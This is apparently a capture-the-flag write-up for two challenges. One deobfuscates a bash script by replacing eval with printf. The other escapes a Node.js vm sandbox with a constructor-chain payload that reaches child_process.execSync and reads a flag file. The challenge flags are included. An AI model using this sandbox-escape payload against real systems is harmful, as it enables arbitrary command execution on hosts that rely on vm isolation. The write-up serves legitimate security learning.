# uglybash
> This bash script evaluates to echo dont just run it, dummy # flag{...} where the flag is in the comments.  
> The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes?  
> Enjoy the intro misc chal.  

My way on solving this challenge is by changing the `eval` command (was `e$'\u0076'al`) into `printf '%s\n`, then run it, and from the output, change the `/bin/bash` command (was `$BASH ${*%%Y#0C}   ${*,,} <<<`) into `printf '%s\n'` and run it.  
flag : `flag{us3_zsh,_dummy}`

# CaaSiNO

> This is a vm jail challenge written in **javascript**  
> It utilizing this vm thing in javascript to create a child process and run every input in a new context so that we could'nt touch the parent context and read the flag  

However there's a flaw in vm javascript that we can use to abuse the system and touch the parent context to be able to read the flag (more on this [here](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html))

and then i use this script to read the flag
```js
this
    .constructor
    .constructor('return this.process')()
    .mainModule
    .require('child_process')
    .execSync('cat /ctf/flag.txt')
    .toString()
```

`flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}`